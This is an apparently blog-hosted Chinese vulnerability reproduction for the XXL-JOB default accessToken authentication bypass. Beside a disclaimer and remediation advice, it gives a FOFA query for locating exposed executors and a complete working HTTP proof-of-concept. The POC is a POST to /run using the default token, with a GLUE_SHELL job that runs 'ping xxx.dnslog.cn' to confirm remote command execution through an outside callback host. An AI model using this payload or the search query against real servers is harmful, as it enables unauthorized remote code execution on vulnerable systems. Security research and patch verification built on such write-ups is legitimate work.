# 原创
：  漏洞复现--XXL-JOB默认accessToken身份绕过漏洞

# 漏洞复现--XXL-JOB默认accessToken身份绕过漏洞

## 免责声明：

文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负

### 一：漏洞描述

2023年11月1日，深瞳漏洞实验室监测到一则XXL-JOB组件存在认证绕过漏洞的信息，漏洞威胁等级：高危。<br/> 该漏洞是由于XXL-JOB 在默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值，如果用户没有修改该默认值，攻击者可利用该默认值在未授权的情况下绕过认证，最终可导致远程代码执行。

### 二：漏洞影响版本

XXL-JOB &lt;= 2.4.0

### 三：网络空间测绘查询

fofa:<br/> `"invalid request, HttpMethod not support" &amp;&amp; port="9999"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/f7f1afb256f04f61186f249a0100168b.jpeg"/><br/> POC:

```
POST /run HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Host: 
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default token
Upgrade-Insecure-Requests: 1
Content-Length: 333


{
"jobId": 1,
"executorHandler": "demoJobHandler",
"executorParams": "demoJobHandler",
"executorBlockStrategy": "SERIAL_EXECUTION",
"executorTimeout": 0,
"logId": 1,
"logDateTime": 1586373637819,
"glueType": "GLUE_SHELL",
"glueSource": "ping xxx.dnslog.cn",
"glueUpdatetime": 1586693836766,
"broadcastIndex": 0,
"broadcastTotal": 0
}

```

存在漏洞：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/e7e9c4450c9fe5eb3660b00da4619bf0.jpeg"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c05c9db5d00c4a1f8a7e00fb9469b959.png"/>

### 五：修复建议

当前官方已发布修复建议，建议受影响的用户及时修改调度中心和执行器配置项 xxl.job.accessToken 的默认值。官方文档链接如下：<br/> https://www.xuxueli.com/xxl-job/#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89
